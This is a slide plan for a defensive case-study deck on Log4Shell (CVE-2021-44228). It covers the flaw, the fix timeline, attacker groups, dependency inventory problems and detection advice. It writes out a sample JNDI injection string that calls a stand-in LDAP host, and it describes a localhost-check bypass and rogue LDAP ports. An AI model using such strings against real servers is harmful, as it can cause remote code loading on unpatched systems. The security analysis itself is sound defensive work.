# Slide plan: Log4Shell (CVE-2021-44228): The Case Study

- Study: case-studies/LOG4SHELL.md
- Cover title: Log4Shell / CVE-2021-44228 / The Case Study
- Subtitle: A 2013 logging feature, five CVEs in twenty days and a library nobody could find
- Published: 3 November 2026
- Notes: Slide plan for the deck of the study case-studies/LOG4SHELL.md. Bracketed numbers in the notes are the study's source numbers.

## EXECUTIVE SUMMARY | Any logged string could make a Java server load remote code

- Apache Log4j 2 sits inside a large share of the world's Java software, usually several dependencies deep.
- A JNDI lookup feature added in 2013 let anyone who got a string into a log line make the server fetch code from a host they controlled.
- No account and no user interaction: a User-Agent header, a game chat message or an email header was enough.
- CVSS 10.0, added to KEV the day the CVE was published, and in use within weeks by botnets, ransomware crews, access brokers and state-linked groups.
- The lasting lesson is the response: an incomplete first fix, a discredited workaround and a library that scanners and SBOMs could not find.
Caption: Grades: the vulnerability, fixes, named actors and government response are Confirmed; a few relayed vendor figures are Reported.
Notes: JNDI lookup and the 2013 feature [6][25][26]. CVSS 10.0 [18]. KEV on 10 December 2021 [21]. Actors [29][31][35][36][38][40]. Follow-on CVEs and the discredited flag [4][9][11]. SBOM finding [25]. Grades from the study's evidence-grade paragraph.

## KEY FACTS | Every triage signal hit its ceiling on day one

Stat: 10.0 | CVSS 3.1 base score from NVD
Stat: 0.99999 | EPSS on 3 November 2026, percentile 1.0
Stat: 10 Dec | added to KEV the day the CVE was published
Stat: 5 | CVEs, counting four follow-ons
- Component: the log4j-core JAR only; applications that use only log4j-api are not affected.
- Affected per Apache: 2.0-beta9 to before 2.3.1, 2.4 to before 2.12.2, 2.13.0 to before 2.15.0.
- Reported to Apache on 24 November 2021 by an Alibaba Cloud Security engineer; Apache credits Chen Zhaojun.
Notes: CVSS vector AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H [18]. EPSS [22]. KEV, due 24 December 2021, ransomware use Known [21]. Follow-on CVEs CVE-2021-45046, CVE-2021-4104, CVE-2021-45105, CVE-2021-44832 [25]. Component and affected range [2]. Report and credit [25][3].

## PART 1 | A 2013 feature turned log lines into network calls

- Log4j 2 evaluates ${prefix:name} lookups when it writes a line; the jndi: prefix hands the name to the Java Naming and Directory Interface.
- A logged ${jndi:ldap://example.com/a} made the library connect to that LDAP server and retrieve the object stored there.
- An LDAP response can point the JVM at a remote Java class, which is how a logged string becomes code execution.
- The DNS variant carries no payload, but a resolved name tells the attacker the target is vulnerable (Inferred).
- The feature was LOG4J2-313, a community request created on 17 July 2013 and resolved the next day for 2.0-beta9.
Caption: JDK 8u121 disabled remote class loading for RMI and COS Naming; its note does not mention LDAP; AA21-356A said updating Java alone is not enough.
Notes: Lookups [26][7]. LDAP to Java class [53][54]. Exploit string protocols [29]; CERT/CC VU#930724 [24]. DNS variant Inferred from [24][28]. LOG4J2-313 [6]; community request [25]. JDK 8u121 [16]; LDAP gap Inferred; GovCERT.ch [52]; AA21-356A [42].

## PART 1 | The first fix was not the last: five CVEs in twenty days

| Date (2021) | Release or event | What changed |
|---|---|---|
| 9 Dec | 2.15.0 on Maven Central | JNDI LDAP limited to localhost, best effort |
| 10 Dec | CVE-2021-44228 announced | formatMsgNoLookups flag or delete JndiLookup.class |
| 13 Dec | 2.16.0 | JNDI off by default; message lookups removed |
| 14 Dec | CVE-2021-45046 | 2.15.0 incomplete; later rescored from 3.7 to 9.0 |
| 18 Dec | 2.17.0 on Maven Central | Recursion fixed; JNDI limited to java: |
| 27 to 29 Dec | 2.17.1, 2.12.4, 2.3.2 | JDBC Appender JNDI limited to java: (CVE-2021-44832) |
Caption: CISA named 2.17.1, 2.12.4 and 2.3.2 as the targets on 28 December 2021; 2.15.0 is not a safe target either way.
Notes: Fix sequence [5][8][9][1][4]. 45046 rescore [4][11]. 2.17.0 dated 17 December in changes.xml, on Maven Central 18 December [5][9]. 44832 [13][15]. CISA targets [45]. 2.15.0 [2][18].

## PART 1 | The popular workaround was later called discredited

Left: What the first guidance offered
- The 10 December announcement: set log4j2.formatMsgNoLookups=true or delete JndiLookup.class.
- Microsoft still described the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable as working on most devices.
- GovCERT.ch's 12 December advice was the same pair.
Right: Why it did not hold
- Apache moved the flag, the variable and the %m{nolookups} patterns into its older (discredited) mitigations.
- The Thread Context lookup path, Logger.printf and some custom message factories still reached lookups.
- A name such as 127.0.0.1#x.y.z passed 2.15.0's localhost check (the Munoz bypass, 18 December).
Caption: Apache's safest course: upgrade, or remove the JndiLookup class, which works in any release other than 2.16.0.
Notes: Announcement [1]. Microsoft [29]. GovCERT.ch [52]; the common-guidance reading is Inferred. Discredited measures and reasons [4]. Bypass [12]. Safest course [4].

## PART 2 | Exploitation began eight days before public disclosure

| Date | Event |
|---|---|
| 24 Nov 2021 | Alibaba Cloud engineer emails the Apache security team |
| 1 Dec 2021 | Earliest known exploitation, over two days (CSRB) |
| 9 Dec 2021, 14:25 UTC | Public disclosure in a now-deleted tweet |
| 10 Dec 2021 | CVE published, KEV entry; APT41 exploits within hours |
| 11 Dec 2021 | Mirai and Muhstik waves; Khonsari ransomware |
| 17 Dec 2021 | CISA Emergency Directive 22-02 |
| 11 Jul 2022 | Cyber Safety Review Board report |
Caption: The CSRB found no use by Chinese, Iranian, North Korean or Russian actors before the 9 December disclosure.
Notes: Report [25]. Earliest exploitation [25]; Cloudflare's three attempts on 1 December [28]; Talos from 2 December [31]. Disclosure [28]. CVE, KEV and APT41 [17][21][38]. Botnets [36]; Khonsari [35]. ED 22-02 [43]. CSRB [25].

## PART 3 | Everyone came, and the sources hedged who

| Actor | What the source reports | Confidence as stated |
|---|---|---|
| APT41 (China) | Exploited within hours; at least two US state governments | Mandiant; timeline unhedged |
| Magic Hound / APT35 (Iran) | Scanning four days after disclosure; CharmPower backdoor | Check Point: "suspected" |
| Aquatic Panda (China) | Attempted Horizon intrusion at a large academic institution | CrowdStrike; exploit steps hedged |
| Lazarus Group (North Korea) | Horizon against energy firms, Feb to Jul 2022 | Talos, high confidence |
| MuddyWater (Iran, MOIS) | SysAid servers in Israel, July 2022 | Microsoft, moderate confidence |
| Unnamed, likely Iranian | Federal civilian network via Horizon, Feb 2022 | CISA and FBI: "likely" |
Caption: AA21-356A named no actor; Mandiant counted 22 clusters exploiting CVE-2021-44228 in its MobileIron survey.
Notes: APT41 [38][39]. Magic Hound [40][29]. Aquatic Panda [37]. Lazarus [32]; Andariel's Operation Blacksmith [33]. MuddyWater [30]. AA22-320A [50]. AA21-356A [42]. Mandiant clusters [39]. HAFNIUM and Sea Turtle [29][80].

## PART 3 | Botnets, miners and ransomware crews piled in within days

Left: Mass exploitation
- 360 Netlab's honeypots caught a Mirai variant and Muhstik on 11 December.
- Talos listed Mirai, the Kinsing miner and known Cobalt Strike servers.
- Bitdefender judged cryptojacking the main early motive.
- Cloudflare's blocked requests rose from 5,483 to 27,439 a minute between 10 and 12 December.
Right: Ransomware and access
- Khonsari, a new ransomware family, arrived through Log4Shell on 11 December.
- Access brokers sold Log4j footholds to ransomware-as-a-service affiliates (Microsoft, 14 December).
- DEV-0401 deployed NightSky through VMware Horizon from 4 January 2022.
- AvosLocker came through two Horizon gateways, February to March 2022 (C0018).
Caption: KEV marks both CVE-2021-44228 and CVE-2021-45046 with known ransomware campaign use.
Notes: Netlab [36]. Talos [31]. Bitdefender [35]. Cloudflare rates [28]. Khonsari [35][29]. Access brokers [29]. NightSky and Cinnamon Tempest [29][78]. AvosLocker [34][82]. Conti Reported only [41]. KEV [21].

## PART 4 | The hard part was finding it, not ranking it

Stat: 35,863 | Maven Central artifacts on affected Log4j code
Stat: >80% | of affected packages had it more than one level deep
Stat: ~65% | of embedding packages held classes, not a JAR
Stat: 33,000 | hours one federal cabinet department spent responding
- Google put the share above 8 percent of Maven Central, against an average advisory impact of 2 percent; most sat five levels deep.
- None of the representative groups for SBOM-using organizations the CSRB spoke with reported using SBOMs to find Log4j.
Notes: Google Open Source Insights, as of 16 December 2021 [59]. JFrog, about 400 packages embedding Log4j code [60]. Cabinet department hours and the SBOM finding [25].

## PART 4 | Scanners that read file names missed the shaded copies

| Tool | Method | Stated limit |
|---|---|---|
| Logpresso log4j2-scan | Reads embedded Maven pom.properties, recursing nested JARs | Depends on that metadata |
| JFrog scan_log4j_versions | Fingerprints JndiManager and JndiLookup class code | Built for transitive and bundled copies |
| MergeBase log4j-detector | Finds shaded, uber and exploded copies, zip-in-zip | Does not enter tar or gz |
| CERT/CC checkjndi | Searches archives for JndiLookup.class | A 2.16 JAR still has the class |
| CISA log4j-scanner | Payloads plus out-of-band DNS callbacks | False negatives may occur |
Caption: The methods form a ladder: file name, embedded metadata, class presence, then class fingerprinting (Inferred).
Notes: Tools [62][61][63][64][46]. Tenable remote and local plugins [65]. The ladder is Inferred from [61][62][63][64]. CISA's affected-products database holds 4,472 entries across 761 vendor names [47].

## PART 4 | The CSRB called it endemic, and the numbers agree

Stat: 8th | in CISA's top exploited list for 2023
Stat: ~40M | vulnerable Log4j downloads from Maven Central in 2025
Stat: 38% | of 38,278 apps used vulnerable Log4j in 2023
- The Board expects Log4j to stay in systems for many years, perhaps a decade or longer, and made 19 recommendations.
- A network telescope study saw exploitation continue from December 2021 to October 2025.
- Upgrade: 2.17.1 or later on Java 8 and up, 2.12.4 on Java 7, 2.3.2 on Java 6.
Notes: AA22-117A first in 2021 [48]; AA24-317A eighth in 2023 [51]. Sonatype, about 13 percent of nearly 300 million downloads [68]. Veracode, August to November 2023 [67]. CSRB endemic finding and 19 recommendations [25]. Telescope study [70]. Upgrade targets [45].

## MITRE MAPPINGS | 62 techniques, with T1190 as the way in

| Id | Technique | Tie to the Log4Shell record |
|---|---|---|
| T1190 | Exploit Public-Facing Application | C0017, C0018, Cinnamon Tempest, Magic Hound; CISA advisories |
| T1595.002 | Vulnerability Scanning | Aquatic Panda DNS logging; Magic Hound scanning |
| T1203 | Exploitation for Client Execution | Sea Turtle, citing PwC |
| T1059.001 | PowerShell | AA22-174A, AA22-320A, C0018, CharmPower |
| T1003.001 | LSASS Memory | AA22-320A; Aquatic Panda; Talos Lazarus |
| T1685 | Disable or Modify Tools | EDR stop attempt; Defender exclusion |
| T1486 | Data Encrypted for Impact | C0018 AvosLocker |
Caption: ATT&CK v20.0: campaigns C0017 and C0018, groups G0096, G0059, G0143 and G1021, software S0674. MITRE notice in the notes.
Notes: 62 Enterprise techniques; no ATT&CK campaign named for Log4Shell in v20.0 [86]. Rows [78][79][83][84][80][49][50][82][86][37][32]. T1685 replaces T1562.001 per superseded_by.jsonl [89]. Navigator layer scores 100, 75 and 40. CWE-502, CWE-917 and CWE-20; D3FEND D3-ITF, D3-NTSA and D3-CSPP map to T1190 [89]. © 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. License: ATT&CK Terms of Use, https://attack.mitre.org/resources/legal-and-branding/terms-of-use/. ATT&CK® and MITRE ATT&CK® are registered trademarks of The MITRE Corporation. This project is not affiliated with or endorsed by MITRE.

## DEFENDER VIEW | Watch egress and process lineage, not just the string

Left: Find the few successes
- Outbound LDAP or RMI from a server is highly uncommon; Fox-IT's Suricata rules are port-agnostic.
- Rogue LDAP servers ran on ports 1389, 1534, 5557, 12344 and 47324.
- Java or Tomcat spawning shells or PowerShell; CrowdStrike caught Aquatic Panda this way.
- Hunt new administrator accounts and Defender exclusions on anything exposed.
Right: Controls that hold
- Block outbound LDAP and RMI or allowlist destinations; send DNS only to approved resolvers.
- Treat a WAF as a bridge: CISA called it important but incomplete.
- Inventory by content, not file name, including nested archives.
- Remove JndiLookup.class only where you cannot upgrade at once.
Caption: NCSC-NL warns that no exhaustive regular expression is possible and that its pattern works only on URL-decoded logs.
Notes: Fox-IT sids 21003738, 21003739, 21003741 [54]. GovCERT.ch ports [52]. Process lineage [37][57]. Post-exploitation hunting [50][49]. AA21-356A egress [42]. WAF [44][28][55]. Inventory [60][61][62][63]. JndiLookup removal [4]. NCSC-NL [53].

## CROSS-CUTTING THEMES | You cannot patch what you cannot find

- **Features are attack surface.** A reasonable 2013 request, accepted in a day, sat in plain sight for eight years.
- **The first patch is a starting point.** A team that closed tickets at 2.15.0 on 10 December had to reopen them three times.
- **Inventory decided the response.** The decisive capability was knowing where Log4j lived, shaded copies five levels down included.
- **Packaged products carried the exposure.** VMware Horizon, MobileIron, SysAid and Minecraft servers recur across the actor reports.
- **Endemic means it is still scanning for you.** EPSS sits at 0.99999 nearly five years on.
Notes: Features [6][25][18]. First patch [9][4][12]; ticket point Inferred from [2][9]. Inventory [59][60][25][75]. Packaged products [32][33][34][37][39][30][29]. Endemic [22][68]. Overstated: a critical-infrastructure catastrophe, per the CSRB [25].
